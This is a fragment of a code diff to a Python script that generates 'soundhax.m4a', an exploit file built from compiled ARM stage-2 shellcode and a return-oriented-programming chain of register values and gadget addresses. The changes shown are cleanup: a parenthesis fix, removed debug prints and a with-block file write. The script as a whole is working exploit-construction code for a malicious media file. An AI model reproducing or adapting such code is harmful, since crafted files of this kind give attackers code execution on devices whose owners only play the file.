@@ -10,7 +10,7 @@ def pb(x):
 def build_shellcode():
   # assemble stage 2
   call(["arm-none-eabi-gcc", "-x", "assembler-with-cpp", "-nostartfiles",
-        "-nostdlib", "-o", "stage2.bin", "stage2.s"]
+        "-nostdlib", "-o", "stage2.bin", "stage2.s"])
   # generate raw instruction bytes
   call(["arm-none-eabi-objcopy", "-O", "binary", "stage2.bin"])
 
@@ -91,8 +91,6 @@ exp += "aaaa" # base
 exp += p(magic_end) # r3
 exp += p(r2) # r2
 exp += p(r1) # r1
-
-print len(exp)
 
 #starts at this pop
 #.text:0027DB00 LDMFD           SP!, {R4-R10,PC}
@@ -327,11 +325,6 @@ def to_string(tree):
     _, res = internal(tree)
     return res
 
-#print repr(to_string(l))
-s = to_string(l)
-print len(s)
-print s.encode("hex")
-open('./soundhax.m4a', 'w').write(s)
-#assert s == original
+with open('./soundhax.m4a', 'w') as f:
+  f.write(to_string(l))
 
-#assert get_data(stage1) == l
